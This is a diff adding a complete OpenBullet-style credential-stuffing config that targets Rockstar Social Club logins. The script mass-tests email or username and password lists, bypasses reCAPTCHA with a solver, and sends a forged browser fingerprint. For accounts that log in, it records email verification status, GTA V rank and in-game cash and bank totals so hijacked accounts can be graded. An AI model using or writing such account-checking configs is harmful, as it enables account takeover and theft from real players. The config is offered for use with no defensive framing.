@@ -1,0 +1,70 @@
+[SETTINGS]
+{
+  "Name": "SocialClub Capture",
+  "SuggestedBots": 20,
+  "LastModified": "2018-05-28T16:32:29.4412159+00:00",
+  "AdditionalInfo": "",
+  "Author": "Choempie",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://socialclub.rockstargames.com/profile/signin" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" REGEX "</li>\s*<input name=\"__RequestVerificationToken\" type=\"hidden\" value=\"([^\"]*)" "[1]" Recursive=FALSE -> VAR "TOKEN" "" "" 
+RECAPTCHA "https://socialclub.rockstargames.com/profile/signin" "6LdYkh8UAAAAAF_3aM1rasLDyDPaA-7wPPPW8HgC" -> VAR "RCAP" 
+REQUEST POST "https://socialclub.rockstargames.com/profile/signincompact" AutoRedirect=TRUE 
+  CONTENT "{\"login\":\"<USER>\",\"password\":\"<PASS>\",\"rememberme\":false,\"key\":\"\",\"response\":\"<RCAP>\",\"captchaType\":\"ReCaptcha\",\"fingerprint\":\"{\\"fp\\":{\\"user_agent\\":\\"36714e67a424501862881bddbc41de62\\",\\"language\\":\\"en-US\\",\\"pixel_ratio\\":1,\\"timezone_offset\\":-120,\\"session_storage\\":1,\\"local_storage\\":1,\\"indexed_db\\":1,\\"open_database\\":1,\\"cpu_class\\":\\"unknown\\",\\"navigator_platform\\":\\"Win32\\",\\"do_not_track\\":\\"unknown\\",\\"regular_plugins\\":\\"f06b6a5e8d6660688b0a6660e5798e38\\",\\"canvas\\":\\"a60d0b8b0957435059f2106635dae58b\\",\\"webgl\\":\\"6d8329f4d9953c10b66a21370d5a6ddb\\",\\"adblock\\":false,\\"has_lied_os\\":false,\\"touch_support\\":\\"0;false;false\\",\\"device_name\\":\\"Chrome on Windows\\",\\"js_fonts\\":\\"771805ee36027aeaa63c4a4b354eb92a\\"}}\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "RequestVerificationToken: <TOKEN>" 
+  HEADER "Referer: https://socialclub.rockstargames.com/profile/signin" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "Status\":true" 
+  KEYCHAIN Failure OR 
+    KEY "The nickname/email and password combination you entered is incorrect" 
+  KEYCHAIN Retry OR 
+#OONIX FUNCTION CurrentUnixTime "" -> VAR "OONIX" 
+REQUEST GET "https://socialclub.rockstargames.com/settings/profilesettings?_=<OONIX>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "RequestVerificationToken: <TOKEN>" 
+PARSE "<SOURCE>" JSON "isemailverified" Recursive=FALSE -> CAP "Verified?" "" "" 
+REQUEST GET "https://socialclub.rockstargames.com/games/gtav/career/overviewAjax?character=Michael&nickname=&slot=Freemode&gamerHandle=&gamerTag=&category=general&_=<OONIX>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "RequestVerificationToken: <TOKEN>" 
+PARSE "<SOURCE>" LR "rank\" data-rank=\"" "\"" Recursive=FALSE -> CAP "Rank" "" "" 
+PARSE "<SOURCE>" LR "cash</span><span id=\"cash-value\">$" "<" Recursive=FALSE -> VAR "var1" "" "" 
+PARSE "<SOURCE>" LR "span id=\"bank-value\">$" "<" Recursive=FALSE -> VAR "var2" "" "" 
+FUNCTION Replace "," "." UseRegex=FALSE "<var1>" -> VAR "varf1" 
+FUNCTION Replace "," "." UseRegex=FALSE "<var2>" -> VAR "varf2" 
+FUNCTION Compute "<varf1>+<varf2>" -> VAR "var3" 
+PARSE "<var3>" LR "" "" Recursive=FALSE -> CAP "Cash " "$" "" 
